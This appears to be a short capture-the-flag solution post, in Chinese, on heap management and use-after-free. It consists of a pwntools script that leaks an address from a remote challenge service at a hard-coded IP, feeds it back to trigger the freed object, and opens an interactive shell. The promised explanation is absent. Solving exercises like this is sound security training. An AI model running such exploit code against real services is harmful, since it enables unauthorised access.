堆管理与UAF

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from re import findall

r = remote('124.16.75.162', 31049)
r.debug = True

print(r.recvuntil(b'> ').decode())
r.sendline(b'1')
print(s:= r.recvuntil(b'> ').decode())
r.sendline(b'16')
print(r.recvuntil(b'> ').decode())
addr = re.findall(r'0x[0-9a-f]+', s)[0]
print(addr)
r.sendline(p64(int(addr, 16)))
print(r.recvuntil(b'> ').decode())
r.sendline(b'1')

r.interactive()
```

详细解析敬请期待
